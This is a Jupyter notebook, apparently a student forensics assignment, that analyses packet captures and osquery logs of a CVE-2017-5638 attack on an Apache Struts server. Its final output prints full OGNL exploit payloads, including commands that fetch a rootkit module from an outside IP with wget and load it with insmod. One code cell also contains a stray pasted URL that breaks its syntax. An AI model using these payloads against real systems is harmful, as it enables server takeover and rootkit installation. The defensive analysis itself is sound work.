{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### somani4, gowtham4, mananm2 - MP3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import os\n",
    "import json\n",
    "import pyshark\n",
    "from IPython.display import Image"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Task 0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### PCAP files"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "http = pyshark.FileCapture('Datasets/http.pcap', keep_packets=True)\n",
    "http2 = pyshark.FileCapture('Datasets/http2.pcap', keep_packets=True)\n",
    "dns = pyshark.FileCapture('Datasets/dns.pcap', keep_packets=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "def process_filecapture(file):\n",
    "    try:\n",
    "        i = 0\n",
    "        while True:\n",
    "            file[i]\n",
    "            i += 1\n",
    "    except KeyError:\n",
    "        pass\n",
    "\n",
    "process_filecapture(http)\n",
    "process_filecapture(http2)\n",
    "process_filecapture(dns)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "604 420 3761\n"
     ]
    }
   ],
   "source": [
    "print(len(http), len(http2),len(dns))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['__bool__',\n",
       " '__class__',\n",
       " '__contains__',\n",
       " '__delattr__',\n",
       " '__dict__',\n",
       " '__dir__',\n",
       " '__doc__',\n",
       " '__eq__',\n",
       " '__format__',\n",
       " '__ge__',\n",
       " '__getattr__',\n",
       " '__getattribute__',\n",
       " '__getitem__',\n",
       " '__getstate__',\n",
       " '__gt__',\n",
       " '__hash__',\n",
       " '__init__',\n",
       " '__init_subclass__',\n",
       " '__le__',\n",
       " '__len__',\n",
       " '__lt__',\n",
       " '__module__',\n",
       " '__ne__',\n",
       " '__new__',\n",
       " '__reduce__',\n",
       " '__reduce_ex__',\n",
       " '__repr__',\n",
       " '__setattr__',\n",
       " '__setstate__',\n",
       " '__sizeof__',\n",
       " '__str__',\n",
       " '__subclasshook__',\n",
       " '__weakref__',\n",
       " '_packet_string',\n",
       " 'captured_length',\n",
       " 'eth',\n",
       " 'frame_info',\n",
       " 'get_multiple_layers',\n",
       " 'get_raw_packet',\n",
       " 'highest_layer',\n",
       " 'interface_captured',\n",
       " 'ip',\n",
       " 'layers',\n",
       " 'length',\n",
       " 'number',\n",
       " 'pretty_print',\n",
       " 'show',\n",
       " 'sniff_time',\n",
       " 'sniff_timestamp',\n",
       " 'tcp',\n",
       " 'transport_layer']"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "## check attr and methods of pyshark captured packets\n",
    "# dir(http[0]['ip'])\n",
    "# dir(http[0]['tcp'])\n",
    "dir(http[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>highest_layer</th>\n",
       "      <th>length</th>\n",
       "      <th>dest_ip</th>\n",
       "      <th>dest_port</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>TCP</td>\n",
       "      <td>58</td>\n",
       "      <td>172.17.0.2</td>\n",
       "      <td>8080</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>TCP</td>\n",
       "      <td>58</td>\n",
       "      <td>10.0.2.2</td>\n",
       "      <td>55952</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>TCP</td>\n",
       "      <td>54</td>\n",
       "      <td>172.17.0.2</td>\n",
       "      <td>8080</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>HTTP</td>\n",
       "      <td>766</td>\n",
       "      <td>172.17.0.2</td>\n",
       "      <td>8080</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>TCP</td>\n",
       "      <td>54</td>\n",
       "      <td>10.0.2.2</td>\n",
       "      <td>55952</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      timestamp highest_layer length     dest_ip dest_port\n",
       "0  1.521395e+09           TCP     58  172.17.0.2      8080\n",
       "1  1.521395e+09           TCP     58    10.0.2.2     55952\n",
       "2  1.521395e+09           TCP     54  172.17.0.2      8080\n",
       "3  1.521395e+09          HTTP    766  172.17.0.2      8080\n",
       "4  1.521395e+09           TCP     54    10.0.2.2     55952"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_data = []\n",
    "for pkt in http:\n",
    "    if len(pkt.layers) < 3:\n",
    "        continue\n",
    "    if pkt[2].layer_name != 'tcp':\n",
    "        continue\n",
    "    \n",
    "    d = {\n",
    "        'timestamp': pkt.sniff_time.timestamp(),\n",
    "        'highest_layer':pkt.highest_layer ,\n",
    "        'length': pkt.length,\n",
    "        'dest_ip': pkt['IP'].dst,\n",
    "        'dest_port': pkt['TCP'].dstport\n",
    "    }\n",
    "    df_data.append(d)\n",
    "\n",
    "df_http = pd.DataFrame(df_data)\n",
    "df_http.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>highest_layer</th>\n",
       "      <th>length</th>\n",
       "      <th>dest_ip</th>\n",
       "      <th>dest_port</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>TLS</td>\n",
       "      <td>55</td>\n",
       "      <td>74.125.124.95</td>\n",
       "      <td>443</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>TCP</td>\n",
       "      <td>66</td>\n",
       "      <td>10.194.59.155</td>\n",
       "      <td>61103</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>TLS</td>\n",
       "      <td>55</td>\n",
       "      <td>104.25.218.21</td>\n",
       "      <td>443</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>TCP</td>\n",
       "      <td>66</td>\n",
       "      <td>10.194.59.155</td>\n",
       "      <td>64299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>TCP</td>\n",
       "      <td>55</td>\n",
       "      <td>151.101.184.193</td>\n",
       "      <td>80</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      timestamp highest_layer length          dest_ip dest_port\n",
       "0  1.553740e+09           TLS     55    74.125.124.95       443\n",
       "1  1.553740e+09           TCP     66    10.194.59.155     61103\n",
       "2  1.553740e+09           TLS     55    104.25.218.21       443\n",
       "3  1.553740e+09           TCP     66    10.194.59.155     64299\n",
       "4  1.553740e+09           TCP     55  151.101.184.193        80"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_data = []\n",
    "for pkt in http2:\n",
    "    if len(pkt.layers) < 3:\n",
    "        continue\n",
    "    if pkt[2].layer_name != 'tcp':\n",
    "        continue\n",
    "    \n",
    "    d = {\n",
    "        'timestamp': pkt.sniff_time.timestamp(),\n",
    "        'highest_layer':pkt.highest_layer ,\n",
    "        'length': pkt.length,\n",
    "        'dest_ip': pkt['IP'].dst,\n",
    "        'dest_port': pkt['TCP'].dstport\n",
    "        \n",
    "    }\n",
    "    df_data.append(d)\n",
    "df_http2 = pd.DataFrame(df_data)\n",
    "df_http2.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>highest_layer</th>\n",
       "      <th>length</th>\n",
       "      <th>dest_ip</th>\n",
       "      <th>source_ip</th>\n",
       "      <th>dest_port</th>\n",
       "      <th>source_port</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>DNS</td>\n",
       "      <td>88</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>53</td>\n",
       "      <td>43204</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>DNS</td>\n",
       "      <td>93</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>43204</td>\n",
       "      <td>53</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>DNS</td>\n",
       "      <td>88</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>53</td>\n",
       "      <td>43204</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>DNS</td>\n",
       "      <td>93</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>43204</td>\n",
       "      <td>53</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>DNS</td>\n",
       "      <td>88</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>53</td>\n",
       "      <td>43204</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      timestamp highest_layer length          dest_ip        source_ip  \\\n",
       "0  1.521397e+09           DNS     88  162.212.156.148        10.0.2.15   \n",
       "1  1.521397e+09           DNS     93        10.0.2.15  162.212.156.148   \n",
       "2  1.521397e+09           DNS     88  162.212.156.148        10.0.2.15   \n",
       "3  1.521397e+09           DNS     93        10.0.2.15  162.212.156.148   \n",
       "4  1.521397e+09           DNS     88  162.212.156.148        10.0.2.15   \n",
       "\n",
       "  dest_port source_port  \n",
       "0        53       43204  \n",
       "1     43204          53  \n",
       "2        53       43204  \n",
       "3     43204          53  \n",
       "4        53       43204  "
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_data = []\n",
    "for pkt in dns:\n",
    "    if len(pkt.layers) < 3:\n",
    "        continue\n",
    "    if pkt[2].layer_name != 'udp':\n",
    "        continue\n",
    "    \n",
    "    d = {\n",
    "        'timestamp': pkt.sniff_time.timestamp(),\n",
    "        'highest_layer': pkt.highest_layer,\n",
    "        'length': pkt.length,\n",
    "        'dest_ip': pkt['ip'].dst,\n",
    "        'source_ip': pkt['ip'].src,\n",
    "        'dest_port': pkt['udp'].dstport,\n",
    "        'source_port': pkt['udp'].srcport\n",
    "    }\n",
    "    df_data.append(d)\n",
    "\n",
    "df_dns = pd.DataFrame(df_data)\n",
    "df_dns.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### JSON files"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>name</th>\n",
       "      <th>hostIdentifier</th>\n",
       "      <th>calendarTime</th>\n",
       "      <th>unixTime</th>\n",
       "      <th>epoch</th>\n",
       "      <th>counter</th>\n",
       "      <th>action</th>\n",
       "      <th>decorations.host_uuid</th>\n",
       "      <th>decorations.username</th>\n",
       "      <th>columns.name</th>\n",
       "      <th>...</th>\n",
       "      <th>columns.md5</th>\n",
       "      <th>columns.mode</th>\n",
       "      <th>columns.mtime</th>\n",
       "      <th>columns.sha1</th>\n",
       "      <th>columns.sha256</th>\n",
       "      <th>columns.size</th>\n",
       "      <th>columns.target_path</th>\n",
       "      <th>columns.time</th>\n",
       "      <th>columns.transaction_id</th>\n",
       "      <th>columns.uid</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>system_info</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:05 2018 UTC</td>\n",
       "      <td>1517877185</td>\n",
       "      <td>0</td>\n",
       "      <td>38463</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>0d4f52b9dacac07cf2316d1686cc707c</td>\n",
       "      <td>0644</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>cffc9b8ead76006419975c0d22ba49d5fdf001a0</td>\n",
       "      <td>43d11069f7682e63289f38d184e4193f7486502f099250...</td>\n",
       "      <td>4096</td>\n",
       "      <td>/etc/osquery/.osquery.conf.swp</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>/etc/osquery/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>/etc/osquery/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>/etc/osquery/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 27 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                   name hostIdentifier                  calendarTime  \\\n",
       "0           system_info         ubuntu  Tue Feb  6 00:33:05 2018 UTC   \n",
       "1  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "2  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "3  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "4  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "\n",
       "     unixTime epoch counter action                 decorations.host_uuid  \\\n",
       "0  1517877185     0   38463  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "1  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "2  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "3  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "4  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "\n",
       "  decorations.username columns.name  ...                       columns.md5  \\\n",
       "0                 root           rk  ...                               NaN   \n",
       "1                 root          NaN  ...  0d4f52b9dacac07cf2316d1686cc707c   \n",
       "2                 root          NaN  ...                                     \n",
       "3                 root          NaN  ...                                     \n",
       "4                 root          NaN  ...                                     \n",
       "\n",
       "  columns.mode columns.mtime                              columns.sha1  \\\n",
       "0          NaN           NaN                                       NaN   \n",
       "1         0644    1517877228  cffc9b8ead76006419975c0d22ba49d5fdf001a0   \n",
       "2                                                                        \n",
       "3                                                                        \n",
       "4                                                                        \n",
       "\n",
       "                                      columns.sha256 columns.size  \\\n",
       "0                                                NaN          NaN   \n",
       "1  43d11069f7682e63289f38d184e4193f7486502f099250...         4096   \n",
       "2                                                                   \n",
       "3                                                                   \n",
       "4                                                                   \n",
       "\n",
       "              columns.target_path columns.time columns.transaction_id  \\\n",
       "0                             NaN          NaN                    NaN   \n",
       "1  /etc/osquery/.osquery.conf.swp   1517877228                      0   \n",
       "2  /etc/osquery/.osquery.conf.swx   1517877228                      0   \n",
       "3  /etc/osquery/.osquery.conf.swx   1517877228                      0   \n",
       "4  /etc/osquery/.osquery.conf.swx   1517877228                      0   \n",
       "\n",
       "  columns.uid  \n",
       "0         NaN  \n",
       "1           0  \n",
       "2              \n",
       "3              \n",
       "4              \n",
       "\n",
       "[5 rows x 27 columns]"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "jsondata = []\n",
    "with open('Datasets/osqueryd.results.log') as data_file:    \n",
    "    for line in data_file:\n",
    "        jsondata.append(json.loads(line))\n",
    "\n",
    "# json_log_data = pd.read_json('Datasets/osqueryd.results.log',lines = True)\n",
    "\n",
    "df_oslogs = pd.json_normalize(jsondata)\n",
    "\n",
    "df_oslogs.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Export to CSV"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# http.csv, http2.csv, dns.csv, and oslogs.csv\n",
    "try:\n",
    "    os.mkdir('CleanedData')\n",
    "except:\n",
    "    pass\n",
    "df_http.to_csv('CleanedData/http.csv')\n",
    "df_http2.to_csv('CleanedData/http2.csv')\n",
    "df_dns.to_csv('CleanedData/dns.csv')\n",
    "df_oslogs.to_csv('CleanedData/oslogs.csv')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Search for #cmd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "7 [519, 529, 539, 551, 577, 587, 597]\n",
      "This [519, 529, 539, 551, 577, 587, 597] packet belongs to attacker as per CVE-2017-5638\n",
      "We see that packets from http.pcap belong to the attacker and http2.pcap belongs to a legitimate user\n"
     ]
    }
   ],
   "source": [
    "# content_type is a method in HTTP layer or DATA_layer\n",
    "\n",
    "def find_cmd(pkt_list):\n",
    "    http_cmd = []\n",
    "    for i in range(len(pkt_list)):\n",
    "        try:\n",
    "            if '#cmd' in pkt_list[i][3].content_type or '#cmd' in pkt_list[i][4].content_type:\n",
    "                http_cmd.append(i)\n",
    "        except:\n",
    "            continue\n",
    "    return http_cmd \n",
    "        \n",
    "http_cmd = find_cmd(http)\n",
    "http2_cmd = find_cmd(http2)\n",
    "\n",
    "for ls in [http_cmd,http2_cmd]:\n",
    "    if len(ls) >0:\n",
    "        print(len(ls),str(ls))\n",
    "        print('This {0} packet belongs to attacker as per CVE-2017-5638'.format(ls))\n",
    "        \n",
    "print('We see that packets from http.pcap belong to the attacker and http2.pcap belongs to a legitimate user')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Task1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### http packet analysis"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1521394903.610774000\n",
      "dst_ip 172.17.0.2\n",
      "dst_port 8080\n",
      "src_ip 10.0.2.2\n",
      "src_port 55952\n",
      "1.a UNIX timestamp of the first attempted scan on the vulnerable server is 1521394903.610774000\n",
      "1.b ip of the vulnerable server is 172.17.0.2\n",
      "1.c ip of the vulnerable server is 8080\n"
     ]
    }
   ],
   "source": [
    "# 1.a first scan\n",
    "# 1.b IP address of the vulnerable server\n",
    "# 1.c port of the vulnerable server\n",
    "\n",
    "for pkt in http:\n",
    "    if len(pkt.layers) < 3:\n",
    "        continue\n",
    "    try:\n",
    "        if pkt.http.request_uri == '/showcase.action':\n",
    "            unix_timestamp_first_attack = pkt.sniff_timestamp\n",
    "            first_vulnerable_server_ip = pkt.ip.dst\n",
    "            first_vulnerable_server_port = pkt.tcp.dstport\n",
    "            attacker_src_ip = pkt.ip.src\n",
    "            attacker_src_port = pkt.tcp.srcport\n",
    "            print(unix_timestamp_first_attack)\n",
    "            print('dst_ip',first_vulnerable_server_ip)\n",
    "            print('dst_port',first_vulnerable_server_port)\n",
    "            print('src_ip', attacker_src_ip)\n",
    "            print('src_port',attacker_src_port)\n",
    "#             print(pkt.show())\n",
    "            break\n",
    "    except:\n",
    "        continue\n",
    "print('1.a UNIX timestamp of the first attempted scan on the vulnerable server is {0}'.format(unix_timestamp_first_attack))\n",
    "print('1.b ip of the vulnerable server is {0}'.format(first_vulnerable_server_ip))\n",
    "print('1.c ip of the vulnerable server is {0}'.format(first_vulnerable_server_port))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Is server response after request uri? : True\n",
      "http://localhost:60080/showcase.action\n",
      "200\n",
      "OK\n",
      "Server: Apache-Coyote/1.1\\xd\\xa\n",
      "IP addr of server:  172.17.0.2\n",
      "Port of server:  8080\n"
     ]
    }
   ],
   "source": [
    "# verify the previous task\n",
    "for pkt in http:\n",
    "    if len(pkt.layers) < 3:\n",
    "        continue\n",
    "    try:\n",
    "        if 'showcase.action' in pkt.http.response_for_uri:\n",
    "            print('Is server response after request uri? :', pkt.sniff_timestamp>unix_timestamp_first_attack)\n",
    "            print(pkt.http.response_for_uri)\n",
    "            print(pkt.http.response_code)\n",
    "            print(pkt.http.response_code_desc)\n",
    "            print(pkt.http.response_line)\n",
    "            print('IP addr of server: ', pkt.ip.addr)\n",
    "            print('Port of server: ', pkt.tcp.port)\n",
    "            break\n",
    "    except:http://localhost:60080/showcase.action\n",
    "        continue"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "header:  length: \n",
      "\n",
      "\n",
      "(\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\", 818)\n",
      "\n",
      "\n",
      "(\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\", 845)\n",
      "\n",
      "\n",
      "('.multipart/form-data~${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL\",1330+7)}', 144)\n",
      "\n",
      "\n",
